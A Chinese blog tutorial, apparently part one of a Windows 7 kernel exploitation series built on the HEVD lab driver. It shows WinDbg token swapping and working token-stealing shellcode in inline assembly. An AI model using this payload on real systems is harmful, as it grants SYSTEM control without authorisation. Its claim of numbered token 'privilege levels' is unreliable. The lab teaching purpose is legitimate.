# 前言
最近，我重新开始了对Windows内核的研究。本文是关于Windows内核漏洞利用系列文章的第一部分，将从一个简单的UAF（Use-After-Free）漏洞入手。为了便于理解，我会尽量详细地讲解每个步骤。本次实验的环境为Windows 7 x86 SP1。研究内核漏洞是一项既刺激又富有挑战性的任务，希望通过这篇文章能够结识更多志同道合的朋友。在开始阅读前，请确保你已经做好了以下准备工作：
- 安装并配置好Windows 7 x86虚拟机
- 准备好Windbg等调试工具，并建议配合VirtualKD使用以提高效率
- 使用HEVD和OSR Loader来搭建漏洞测试环境

# 漏洞原理
## 提权机制概述
首先需要明确的是，在正常情况下，普通用户运行的应用程序并不具备系统级别的权限。然而，在某些特定的安全漏洞被利用时，攻击者可能会试图提升其应用程序的权限至系统级别。接下来，我们将通过一个小实验来直观展示这一过程。

### 实验设置
启动你的虚拟机，并以普通用户身份打开命令提示符窗口（CMD）。随后，在Windbg中使用`!dml_proc`命令查看当前所有进程的信息。
```plaintext
kd> !dml_proc
Address  PID  Image file name
865ce8a8 4    System         
87aa9970 10c  smss.exe       
880d4d40 164  csrss.exe      
881e6200 198  wininit.exe    
881e69e0 1a0  csrss.exe      
...
87040ca0 bc0  cmd.exe
```
从输出结果可以看出，`System`进程的地址是 `865ce8a8`，而我们刚刚打开的CMD进程地址为 `87040ca0`。

### Token概念介绍
在Windows操作系统中，`Token`可以被视为一种标识符，它定义了一个进程或线程的安全上下文。不同的`Token`代表不同的权限等级，例如系统级别的`Token`具有最高权限（通常认为是第5级），而普通用户的`Token`则对应较低的权限等级（如第1级）。

### 修改Token进行提权
现在让我们来看看如何通过修改`Token`来实现权限提升。根据文档，`Token`位于进程结构体`_EPROCESS`偏移量`0xf8`的位置。我们可以分别查看系统进程和服务进程的`Token`值。
```plaintext
kd> dt nt!_EX_FAST_REF 865ce8a8+f8
+0x000 Object           : 0x8a201275 Void
+0x000 RefCnt           : 0y101
+0x000 Value            : 0x8a201275 // system token

kd> dt nt!_EX_FAST_REF 87040ca0+f8
+0x000 Object           : 0x944a2c02 Void
+0x000 RefCnt           : 0y010
+0x000 Value            : 0x944a2c02 // cmd token
```

接着，我们尝试将CMD进程的`Token`更改为与系统相同的值。
```plaintext
kd> ed 87040ca0+f8 8a201275
kd> dt nt!_EX_FAST_REF 87040ca0+f8
+0x000 Object           : 0x8a201275 Void
+0x000 RefCnt           : 0y101
+0x000 Value            : 0x8a201275
```
此时如果再次执行`whoami`命令，你会发现当前会话已获得系统权限。

### 代码实现
以下是上述操作转换成汇编语言的形式：
```cpp
void ShellCode()
{
    _asm
    {
        nop
        nop
        nop
        nop
        pushad
        mov eax, fs:[124h]       // 获取当前线程的_KTHREAD结构
        mov eax, [eax + 0x50]    // 获取_EPROCESS结构
        mov ecx, eax             // 保存当前进程的_EPROCESS
        mov edx, 4               // 系统PID始终为4
        
find_sys_pid:
        mov eax, [eax + 0xb8]   // 遍历进程链表
        sub eax, 0xb8
        cmp [eax + 0xb4], edx    // 检查是否找到系统进程
        jnz find_sys_pid
        
        // 替换Token
        mov edx, [eax + 0xf8]
        mov [ecx + 0xf8], edx
        popad
        ret
    }
}
```
以上代码首先定位到当前线程的`_KTHREAD`结构，然后通过一系列指针运算最终找到系统进程的`_EPROCESS`结构，并将其`Token`复制给当前进程，从而完成提权。

希望这篇介绍能帮助大家更好地理解Windows内核中的基本提权方法。如果你有任何问题或想要进一步探讨的话题，欢迎随时联系我！